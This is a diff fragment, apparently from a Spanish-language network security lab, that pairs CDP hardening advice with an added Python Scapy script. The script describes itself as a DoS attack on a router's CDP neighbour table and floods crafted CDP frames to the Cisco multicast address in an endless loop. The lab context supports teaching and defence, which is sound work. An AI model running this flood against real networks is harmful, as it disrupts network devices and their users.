@@ -24,3 +24,34 @@ garantizar la compatibilidad con el Switch.
 • Deshabilitar CDP globalmente con el comando no cdp run. 
 • Deshabilitar el protocolo en interfaces que dan hacia áreas no confiables con no 
 cdp enable.
+
+README.md
+-----
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+from scapy.all import *
+
+# NOTA TÉCNICA: En este entorno Scapy v2.6, el protocolo 'cdp' no está 
+# definido de forma nativa. Se requiere la carga manual de la contribución.
+load_contrib("cdp")
+
+def cdp_flood():
+    print("Iniciando ataque DoS a la tabla de vecinos CDP...")
+    print("Objetivo: Inundar el Router con la matrícula MAT_20231243")
+    
+    # Construcción del paquete usando capas Raw y SNAP para máxima 
+    # compatibilidad con switches y routers Cisco.
+    # Dirección Multicast de Cisco: 01:00:0c:cc:cc:cc
+    pkt = (
+        Ether(dst="01:00:0c:cc:cc:cc") /
+        SNAP() /
+        Raw(load=b"\x02\x01\x00\x0c\x01\x01\x00\x11MAT_20231243")
+    )
+
+    # Envío en bucle infinito con intervalo de 0.1 segundos
+    sendp(pkt, loop=1, inter=0.1)
+
+if __name__ == "__main__":
+    cdp_flood()
